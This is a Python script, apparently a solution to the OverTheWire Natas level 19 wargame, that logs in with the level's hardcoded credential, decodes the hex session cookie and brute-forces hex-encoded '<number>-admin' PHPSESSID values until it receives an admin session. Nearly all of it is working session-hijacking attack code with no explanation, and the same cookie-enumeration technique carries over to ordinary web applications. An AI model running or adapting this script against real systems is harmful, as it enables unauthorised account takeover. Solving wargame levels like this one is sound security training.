# exploit.

import requests
import time
import binascii
from requests.auth import HTTPBasicAuth

url = 'http://natas19.natas.labs.overthewire.org/'
auth_info = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
submit_data = {'username':'admin', 'password':'admin'}

r = requests.post(url, auth = auth_info, data = submit_data)
print("[*] Status Code: " + str(r.status_code))
print("[*] Cookie PHPSESSID value: " + str(r.cookies["PHPSESSID"]))

cookie_value = str(r.cookies["PHPSESSID"])

# Decoding the cookie value to ASCII.
print("[*] Decoding the cookie value [" + str(cookie_value) + "] to ASCII.")
for sleep_time in range(0,3):
    time.sleep(1)
    print("")
cookie_value_bytes = bytes.fromhex(cookie_value)
decoded_cookie_value = cookie_value_bytes.decode("ASCII")
print("[*] Decoded cookie value: " + str(decoded_cookie_value))

# cookie_value = <number from 0-640>-admin.
# enumerate all the possible number values.

regular_user_string = 'You are logged in as a regular user.'
for cookie_number in range(0,640):
    print("[-] Trying PHPSESSID = " + str(cookie_number) + "-admin")
    cookie_val = binascii.hexlify('{0}-admin'.format(cookie_number).encode('utf-8'))
    exploit_cookie = dict(PHPSESSID=cookie_val.decode("ASCII"))
    r = requests.post(url, auth = auth_info, data = submit_data, cookies = exploit_cookie)
    if not regular_user_string in r.text:
        print("[*] You are logged in as admin.")
        print("[*] Response: \n" + str(r.text))
        break
        
        
